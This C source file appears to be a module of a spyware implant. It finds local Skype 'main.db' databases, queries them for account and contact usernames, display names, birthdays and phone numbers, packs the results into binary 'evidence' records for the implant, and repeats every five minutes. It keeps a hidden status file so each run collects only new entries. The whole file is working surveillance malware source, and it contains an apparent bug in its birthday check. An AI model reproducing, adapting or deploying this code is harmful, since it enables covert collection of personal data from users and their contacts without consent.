#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <openssl/bio.h>
#include <openssl/md5.h>
#include <sqlite3.h>
#include <linux/limits.h>
#include <glob.h>

#include "module.h"
#include "bioutils.h"
#include "evidencemanager.h"
#include "me.h"
#include "so.h"
#include "runtime.h"

#define ENTRY_REMOTE 0x00000000
#define ENTRY_LOCAL  0x80000000

#define PROGRAM_SKYPE 0x02

#define TYPE_USERNAME    0x40000000
#define TYPE_DISPLAYNAME 0x01000000
#define TYPE_EMAIL1      0x06000000
#define TYPE_EMAIL2      0x0D000000
#define TYPE_EMAIL3      0x0F000000
#define TYPE_BIRTHDAY    0x31000000
#define TYPE_PHONEHOME   0x0C000000
#define TYPE_PHONEOFFICE 0x0A000000
#define TYPE_PHONEMOBILE 0x07000000

static int skype_getaddressbook(void);
static int skype_getentries(char *maindb);
static int skype_sqlcallback(void *arg, int num, char **val, char **key);

struct entry {
   int program;
   int type;
   char *username;
   char *displayname;
   char *birthday;
   char *phonehome;
   char *phoneoffice;
   char *phonemobile;
   struct entry *next;
};

static struct entry *list = NULL, *listp = NULL;

void *module_addressbook_main(void *args)
{
   BIO *bio_mem = NULL, *bio_data = NULL;
   char *memptr = NULL, *dataptr = 0;
   int memlen = 0;
   long datalen = 0;
   int i, flag;
   fd_set rfds;
   struct timeval tv;

   debugme("Module ADDRESSBOOK started\n");

   do {
      if(!(bio_mem = BIO_new(BIO_s_mem()))) break;
      if(!(bio_data = BIO_new(BIO_s_mem()))) break;

      while(MODULE_ADDRESSBOOK.status != MODULE_STOPPING) {
         skype_getaddressbook();

         debugme("- Addressbook dump begin\n");
         for(listp = list; listp; listp = listp->next) debugme("--- %s\n", listp->displayname);
         debugme("- Addressbook dump end\n");

         if(list) {
            for(listp = list; listp; listp = listp->next) {
               if(listp->username) {
                  flag = strlen16(listp->username) | TYPE_USERNAME;
                  BIO_write(bio_mem, &flag, sizeof(flag));
                  BIO_puts16(bio_mem, listp->username);
               }
               if(listp->displayname) {
                  flag = strlen16(listp->displayname) | TYPE_DISPLAYNAME;
                  BIO_write(bio_mem, &flag, sizeof(flag));
                  BIO_puts16(bio_mem, listp->displayname);
               }
               if(listp->birthday) {
                  flag = strlen16(listp->birthday) | TYPE_BIRTHDAY;
                  BIO_write(bio_mem, &flag, sizeof(flag));
                  BIO_puts16(bio_mem, listp->birthday);
               }
               if(listp->phonehome) {
                  flag = strlen16(listp->phonehome) | TYPE_PHONEHOME;
                  BIO_write(bio_mem, &flag, sizeof(flag));
                  BIO_puts16(bio_mem, listp->phonehome);
               }
               if(listp->phoneoffice) {
                  flag = strlen16(listp->phoneoffice) | TYPE_PHONEOFFICE;
                  BIO_write(bio_mem, &flag, sizeof(flag));
                  BIO_puts16(bio_mem, listp->phoneoffice);
               }
               if(listp->phonemobile) {
                  flag = strlen16(listp->phonemobile) | TYPE_PHONEMOBILE;
                  BIO_write(bio_mem, &flag, sizeof(flag));
                  BIO_puts16(bio_mem, listp->phonemobile);
               }

               memlen = BIO_get_mem_data(bio_mem, &memptr);
               flag = memlen + 20;

               BIO_write(bio_data, &flag, sizeof(flag));
               BIO_write(bio_data, "\x01\x00\x00\x01\x00\x00\x00\x00", 8);
               BIO_write(bio_data, &listp->program, sizeof(listp->program));
               BIO_write(bio_data, &listp->type, sizeof(listp->type));
               BIO_write(bio_data, memptr, memlen);

               BIO_reset(bio_mem);
            }

            if((datalen = BIO_get_mem_data(bio_data, &dataptr))) evidence_write(EVIDENCE_TYPE_ADDRESSBOOK, NULL, 0, dataptr, datalen);

            BIO_reset(bio_data);

            for(listp = list; listp;) {
               list = listp;
               listp = listp->next;
               if(list->username) free(list->username);
               if(list->displayname) free(list->displayname);
               if(list->birthday) free(list->birthday);
               if(list->phonehome) free(list->phonehome);
               if(list->phoneoffice) free(list->phoneoffice);
               if(list->phonemobile) free(list->phonemobile);
               free(list);
            }
            list = NULL;
         }

         FD_ZERO(&rfds);
         FD_SET(MODULE_ADDRESSBOOK.event, &rfds);
         tv.tv_sec = 300;
         tv.tv_usec = 0;
         select(MODULE_ADDRESSBOOK.event + 1, &rfds, NULL, NULL, &tv);
      }
   } while(0);
   if(bio_mem) BIO_free(bio_mem);
   if(bio_data) BIO_free(bio_data);

   debugme("Module ADDRESSBOOK stopped\n");

   return NULL;
}

static int skype_getaddressbook(void)
{
   char file[PATH_MAX];
   glob_t maindb = {0};
   int i;

   do {
      if(initlib(INIT_LIBSQLITE3)) break;
      if(snprintf(file, sizeof(file), SO"%s/.Skype/*/main.db", getenv(SO"HOME")) >= sizeof(file)) break;
      if(glob(file, GLOB_NOSORT, NULL, &maindb)) break;
      for(i = 0; i < maindb.gl_pathc; i++) skype_getentries(maindb.gl_pathv[i]);
   } while(0);
   globfree(&maindb);

   return 0;
}

static int skype_getentries(char *maindb)
{
   FILE *fp = NULL;
   char line[4096];
   unsigned char md5[MD5_DIGEST_LENGTH];
   char statusfile[2 + (MD5_DIGEST_LENGTH * 2) + 1];
   char query[256];
   int lastid1 = 0, lastid2 = 0;
   sqlite3 *db = NULL;

   do {
      debugme("ADDRESSBOOK Database: %s\n", maindb);

      MD5((unsigned char *)maindb, strlen(maindb), md5);

      snprintf(statusfile, sizeof(statusfile), SO"AB%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
                                               md5[0], md5[1], md5[2], md5[3], md5[4], md5[5], md5[6], md5[7], md5[8], md5[9], md5[10], md5[11], md5[12], md5[13], md5[14], md5[15]);

      do {
         if(!(fp = fopen(statusfile, "r"))) break;
         if(!fgets(line, sizeof(line), fp)) break;
         lastid1 = atoi(line);
         if(!fgets(line, sizeof(line), fp)) break;
         lastid2 = atoi(line);
      } while(0);
      if(fp) fclose(fp);

      if(sqlite3_open(maindb, &db) != SQLITE_OK) break;

      if(snprintf(query, sizeof(query), SO"SELECT id, skypename, fullname from Accounts WHERE id > %u AND is_permanent = '1' ORDER BY id", lastid1) >= sizeof(query)) break;
      if(sqlite3_exec(db, query, skype_sqlcallback, (void *)&lastid1, NULL) != SQLITE_OK) break;

      if(snprintf(query, sizeof(query), SO"SELECT id, skypename, displayname, birthday, phone_home_normalized, phone_office_normalized, phone_mobile_normalized FROM Contacts WHERE id > %u AND is_permanent = '1' ORDER BY id", lastid2) >= sizeof(query)) break;
      if(sqlite3_exec(db, query, skype_sqlcallback, (void *)&lastid2, NULL) != SQLITE_OK) break;
   } while(0);
   if(db) sqlite3_close(db);

   do {
      if(!(fp = fopen(statusfile, "w"))) break;
      fprintf(fp, "%u\n%u\n", lastid1, lastid2);
   } while(0);
   if(fp) fclose(fp);

   return 0;
}

static int skype_sqlcallback(void *arg, int num, char **val, char **key)
{
   do {
      *((int *)arg) = atoi(val[0]);         

      if(!list) {
         if(!(list = malloc(sizeof(struct entry)))) break;
         listp = list;
      } else {
         if(!(listp->next = malloc(sizeof(struct entry)))) break;
         listp = listp->next;
      }
      memset(listp, 0, sizeof(struct entry));

      listp->program = PROGRAM_SKYPE;

      if(num == 3) {
         listp->type = ENTRY_LOCAL;
         if(val[1]) listp->username = strdup(val[1]);
         if(val[2]) listp->displayname = strdup(val[2]);
      } else if(num == 7) {
         listp->type = ENTRY_REMOTE;
         if(val[1]) listp->username = strdup(val[1]);
         if(val[2]) listp->displayname = strdup(val[2]);
         if(val[4] && (strlen(val[4]) == 8)) asprintf(&listp->birthday, "%c%c/%c%c/%c%c%c%c", val[3][6], val[3][7], val[3][4], val[3][5], val[3][0], val[3][1], val[3][2], val[3][3]);
         if(val[4]) listp->phonehome = strdup(val[4]);
         if(val[5]) listp->phoneoffice = strdup(val[5]);
         if(val[6]) listp->phonemobile = strdup(val[6]);
      }
   } while(0);

   return 0;
}
